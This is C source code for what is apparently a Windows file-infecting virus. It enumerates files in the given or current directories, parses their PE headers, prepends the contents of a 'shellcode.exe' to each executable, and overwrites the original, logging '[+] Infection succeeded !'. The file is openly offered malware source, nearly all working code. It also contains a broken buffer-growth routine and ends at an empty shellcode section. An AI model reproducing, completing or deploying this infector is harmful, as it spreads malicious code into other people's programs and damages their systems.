#include <inttypes.h> // DAFUQ ?
#include <string.h>
#include <unistd.h> // : _getcwd
//#include <strsafe.h> // Cause TONS of warnings
#include <shlwapi.h>
#include "utils.h"


// Declarations
int infectDirectory(String* directory);
int infectFile(String* file);
String** listDirectoryFile(String* dir);

/// Entry point
int main(int ac, char** args) {
  // I miss foreach :(
  String dir;
  for (int i = 1; i < ac; ++i) {
    dir.ptr = args[i];
    dir.length = strlen(args[i]);
    infectDirectory(&dir);
  }
  if (ac < 2) {
    dir.ptr = _getcwd(NULL, 0);
    dir.length = strlen(dir.ptr);
    infectDirectory(&dir);
  }
  return 0;
}

int infectDirectory(String* dir) {
  printf("[+] Infecting directory %s\n", dir->ptr);
  String** files = listDirectoryFile(dir);
  if (files == NULL)
    return printf("[-] Cannot infect directory %s due to errors.\n", dir->ptr);
  for (size_t i = 0; files[i] != NULL; ++i) {
    printf("\t[+] Infecting file %s\n", files[i]->ptr);
    if (infectFile(files[i]))
      printf("\t[-] File %s could not be infected due to errors.\n", files[i]->ptr);
    free(files[i]);
    files[i] = NULL;
  }
  free(files);
  return 0;
}

int infectFile(String* file) {
  //DWORD attrs = GetFileAttributes(file->ptr);
  buffer_t* buff = readFileToFileBuffer(file->ptr);
  if (buff == NULL) return 1;

  // This is copy-pasta to/from shellcode.
  size_t minSize;
  PeHeader* h = getPEHeader(buff, &minSize);
  if (h == NULL) return 1;
  PeOptHeader32* optH32 = (PeOptHeader32*)(h + 1);
  int is64Bits = (optH32->Magic == OPT_HEADER_MAGIC64);
  // Get the data directories
  DataDir* dataDir = NULL;
  uint32_t dataDirLen = getDataDir(buff, h, &dataDir, &minSize);
  if (dataDirLen == 0 || dataDir == NULL) return 1;

  // Get the last section
  //SectionHeader* firstSection = (SectionHeader*)(dataDir + dataDirLen);
  //SectionHeader* lastSection = firstSection + (h->NumberOfSections - 1);
  minSize += sizeof(SectionHeader) * (h->NumberOfSections - 1);
  if (buff->len < minSize)
    return printf("\t[-] Corrupted file (too small for sections).\n");

  
  // Get original entry point
  uint64_t oepRVA;
  oepRVA = optH32->AddressOfEntryPoint;

  printf("\t[I] File is of type %s\n", is64Bits ? "PE32+ (64 bits)" : "PE32 (32 bits)");
  printf("\t[I] Found %d data directory at offset 0x%p\n", dataDirLen, dataDir);
  printf("\t[I] Old entry point (RVA: %I64X)\n", oepRVA);

  char strBuf[MAX_PATH];
  strcpy(strBuf, "randomName.exe");
  HANDLE tmp = createTempFile(strBuf);
  buffer_t* shc = readFileToFileBuffer("shellcode.exe");
  DWORD bytesWritten;
  if (!WriteFile(tmp, shc->buf, shc->len, &bytesWritten, NULL))
    return printf("\t[-] Writting to the temp file failed: %ld.\n", GetLastError());
  buffer_destroy(&shc);
  if (!WriteFile(tmp, buff->buf, buff->len, &bytesWritten, NULL))
    return printf("\t[-] Writting to the temp file failed: %ld.\n", GetLastError());
  CloseHandle(tmp);
  
  /*
    for (size_t it = 0; it < h->NumberOfSections; ++it) {
    SectionHeader* curr = firstSection + it;
    printf("\t[I] Section %.8s\n", curr->Name);
    printf("\t[I] Offset: %X\n", curr->PointerToRawData);
    printf("\t[I] Size: %d\n", curr->SizeOfRawData);
    }
  */

  buffer_destroy(&buff);
  if (!MoveFileEx(strBuf, file->ptr, MOVEFILE_REPLACE_EXISTING))
    return printf("\t[-] Replacing the file failed : %ld.\n", GetLastError());
  //SetFileAttributes(strBuf, attrs);
  printf("\t[+] Infection succeeded !\n");
  
  /*
    DWORD realFileSize = GetFileSize(hOrig, NULL);
    uint32_t origFileSize = getExeSize(firstSection, lastSection);
    printf("\t[I] File size is supposed to be %X.\n", origFileSize);
    DosHeader* sFile = (DosHeader*)(buff->buf + origFileSize);
    if (sFile->e_magic != MSDOS_MAGIC)
    return printf("\t[-] Cannot find second file.\n");
    printf("\t[I] Updating %d to %I64X\n", dosH->e_lfanew,
    dosH->e_lfanew + ((size_t)sFile - (size_t)dosH));
    //dosH->e_lfanew = (sFile->e_lfanew + ((size_t)sFile - (size_t)dosH));
    */

  return 0;
}

/// TODO
String** listDirectoryFile(String* dir) {
  String** ret;
  size_t retLength = 32;
  size_t count = 0;
  ret = malloc(retLength * sizeof(String*));

  // http://msdn.microsoft.com/en-us/library/windows/desktop/aa365200(v=vs.85).aspx
  if (dir->length > (MAX_PATH - 3)) {
    printf("\t[-] Directory path is too long.\n");
    return NULL;
  }

  TCHAR szDir[MAX_PATH];
  strcpy(szDir, dir->ptr);
  strcat(szDir, "\\*");

  // Find the first file in the directory.
  WIN32_FIND_DATA ffd;
  HANDLE hFind = INVALID_HANDLE_VALUE;
  hFind = FindFirstFile(szDir, &ffd);

  if (INVALID_HANDLE_VALUE == hFind) {
    printf("\t[-] Unable to open first file for directory.\n");
    return NULL;
  }

  // List all the files in the directory with some info about them.
  do {
    printf("\t[I] %s = %lX\n", ffd.cFileName, ffd.dwFileAttributes);
    if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
	&& !(ffd.dwFileAttributes & FILE_ATTRIBUTE_OFFLINE)
	&& !(ffd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)) {
      if (count >= (retLength - 1))
	if (NULL == (ret = realloc(ret, retLength))) {
	  printf("\t[-] Expanding the buffer failed.\n");
	  return NULL;
	}
      ret[count] = malloc(sizeof(String));
      ret[count]->ptr = strdup(ffd.cFileName);
      ret[count]->length = strlen(ffd.cFileName);
      ++count;
    } else if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
      printf("\t[I] Ignoring readonly file %s.\n", ffd.cFileName);
  } while (FindNextFile(hFind, &ffd) != 0);
  ret[count] = NULL;

  DWORD dwError = GetLastError();
  if (dwError != ERROR_NO_MORE_FILES) {
    printf("\t[-] FindNextFile failed with error code: %ld\n", dwError);
    return NULL;
  }

  FindClose(hFind);
  return ret;
}

////////////////////////////////////////////////////
//////////////////// SHELL CODE ////////////////////
////////////////////////////////////////////////////
